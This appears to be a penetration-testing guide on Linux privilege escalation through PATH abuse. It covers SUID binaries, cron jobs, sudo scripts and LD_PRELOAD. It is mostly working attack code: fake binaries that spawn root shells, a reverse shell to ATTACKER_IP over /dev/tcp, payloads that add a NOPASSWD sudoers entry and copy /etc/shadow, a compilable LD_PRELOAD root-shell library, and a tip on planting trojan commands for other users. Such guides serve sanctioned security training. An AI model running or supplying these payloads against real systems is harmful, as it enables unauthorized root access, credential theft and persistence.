---
title: 'PATH Abuse'
description: 'Linux privilege escalation via PATH abuse — writable PATH directories, PATH injection in SUID binaries, cron jobs, and sudo scripts with practical exploitation steps.'
---

# PATH Abuse

PATH is an environment variable listing directories the shell searches (left to right) when you type a command. If you can inject a malicious binary earlier in the PATH than the real one, you hijack the command.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

## Quick Reference — When PATH Abuse Applies

| Scenario | How to Exploit |
|:---------|:--------------|
| Writable directory in PATH | Place malicious binary there with name of a command called by root |
| SUID binary calls commands without full path | Create fake command earlier in PATH |
| Cron job script uses relative commands | Manipulate PATH so your binary runs instead |
| `sudo` script calls commands without full path | Same as SUID — inject into PATH |
| `.` (current dir) is in PATH | Drop malicious binary in CWD |

---

## 1. Enumeration

### Check for Writable Directories in PATH

```bash
# Show current PATH
echo $PATH

# Check which PATH directories are writable by current user
for dir in $(echo $PATH | tr ':' ' '); do
    if [ -w "$dir" ]; then
        echo "[!] Writable PATH directory: $dir"
    fi
done
```

!!! tip "Key Insight"
    If ANY directory in your PATH is writable AND a privileged process (SUID binary, cron job, sudo script) calls a command using a **relative path** (e.g., `cat` instead of `/bin/cat`), you can hijack it.

### Check SUID/Sudo Binaries for Relative Paths

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Inspect a suspicious SUID binary for command calls
strings /path/to/suid-binary | grep -E "^[a-z]" | head -20

# Or use ltrace/strace to see what it executes
ltrace /path/to/suid-binary 2>&1 | grep -i "system\|exec\|popen"
strace /path/to/suid-binary 2>&1 | grep "execve"
```

### Check Cron Jobs and Scripts for Relative Paths

```bash
# Look at cron scripts for commands without full paths
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/* 2>/dev/null

# In any script, grep for commands without /
grep -n '[^/]system\|[^/]exec\|[^/]popen' /path/to/script.sh
```

---

## 2. Exploitation — SUID Binary with Relative Path

The most common PATH abuse scenario: a SUID binary (running as root) calls a command like `cat`, `ps`, `service`, etc. without the full path.

### Step-by-Step

```bash
# 1. Identify the vulnerable SUID binary
find / -perm -4000 -type f 2>/dev/null

# 2. Inspect what commands it calls (look for relative paths)
strings /path/to/suid-binary
# Example output shows it calls: "service apache2 restart"
# "service" is called without /usr/sbin/service → exploitable!

# 3. Create a malicious binary with the same name
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service    # -p preserves SUID privileges
chmod +x service

# 4. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 5. Run the SUID binary — it calls our fake "service" as root
/path/to/suid-binary
# → root shell!
```

!!! warning "Use `/bin/bash -p`"
    The `-p` flag is critical. Without it, bash drops SUID privileges on startup. Always use `-p` when exploiting SUID binaries.

### Alternative Payloads for the Fake Binary

```bash
# Reverse shell
echo '#!/bin/bash' > service
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> service
chmod +x service

# Add user to sudoers
echo '#!/bin/bash' > service
echo 'echo "youruser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> service
chmod +x service

# Copy /bin/bash as SUID
echo '#!/bin/bash' > service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> service
chmod +x service
# Then run: /tmp/rootbash -p

# Read /etc/shadow
echo '#!/bin/bash' > service
echo 'cat /etc/shadow > /tmp/shadow.txt && chmod 644 /tmp/shadow.txt' >> service
chmod +x service
```

---

## 3. Exploitation — Dot (`.`) in PATH

If `.` (current directory) is in the PATH, any binary in your current working directory takes priority.

```bash
# Add current directory to PATH
export PATH=.:$PATH

# Create a malicious "ls" in current directory
echo '#!/bin/bash' > ls
echo '/bin/bash -p' >> ls
chmod +x ls

# Now when anyone runs "ls" from this directory...
ls
# → shell with their privileges
```

!!! tip "Trap for Other Users"
    If `.` is in another user's PATH (or root's), drop a malicious binary named after a common command (`ls`, `cat`, `id`, `clear`) in a directory they're likely to `cd` into (like `/tmp` or a shared directory).

---

## 4. Exploitation — Cron Job with Relative Paths

If a cron job runs a script as root, and that script calls commands with relative paths:

```bash
# Example: cron runs /opt/backup.sh as root
# /opt/backup.sh contains: tar czf /backup/files.tar.gz /var/www/

# 1. Check if you can modify the script's environment or PATH
# 2. Create malicious "tar" binary
echo '#!/bin/bash' > /tmp/tar
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/tar
chmod +x /tmp/tar

# 3. If the cron job's PATH includes /tmp before /bin, or if you
#    can modify the script to prepend /tmp to PATH, the exploit fires
#    when the cron job runs next
```

### Modifying PATH in Crontab

If you have write access to the crontab or to the script itself:

```bash
# In crontab, PATH is defined at the top:
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# If you can edit this to:
# PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# Then any fake binary in /tmp takes priority
```

---

## 5. Exploitation — Sudo Script with Relative Paths

```bash
# Check sudo permissions
sudo -l
# Output: (root) NOPASSWD: /opt/scripts/backup.sh

# If backup.sh calls "tar" without full path:
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash' >> /tmp/tar
chmod +x /tmp/tar

# Prepend /tmp to PATH and run via sudo
# NOTE: sudo usually resets PATH (secure_path), so this may not work
# unless env_keep or !secure_path is set

# Check if sudo preserves PATH
sudo -l | grep "env_keep\|secure_path\|env_reset"

# If secure_path is NOT set or env_keep includes PATH:
export PATH=/tmp:$PATH
sudo /opt/scripts/backup.sh
```

!!! warning "sudo `secure_path`"
    Most modern sudo configs define `secure_path` in `/etc/sudoers`, which **overrides your PATH** when running sudo commands. Check `sudo -l` output — if you see `secure_path`, direct PATH injection won't work. You'll need to modify the script itself instead.

---

## 6. Shared Library PATH Abuse (LD_PRELOAD / LD_LIBRARY_PATH)

Related to PATH abuse but targets shared libraries instead of binaries.

### LD_PRELOAD

If `sudo -l` shows `env_keep += LD_PRELOAD`:

```c
// shell.c — compile this on attacker or target
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Run any allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_command
# → root shell
```

### LD_LIBRARY_PATH

If `sudo -l` shows `env_keep += LD_LIBRARY_PATH`:

```bash
# 1. Find shared libraries used by the allowed command
ldd /usr/bin/allowed_command

# 2. Create a malicious version of one of those libraries
# (same compile as above, but name it after a real library)
gcc -fPIC -shared -nostartfiles -o /tmp/libcrypt.so.1 shell.c

# 3. Run with LD_LIBRARY_PATH pointing to /tmp
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_command
```

---

## Cheatsheet — PATH Abuse in 30 Seconds

```bash
# 1. Find the target (SUID binary calling relative command "service")
strings /path/to/suid | grep service

# 2. Create fake binary
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service && chmod +x /tmp/service

# 3. Hijack PATH
export PATH=/tmp:$PATH

# 4. Trigger
/path/to/suid
# → root
```
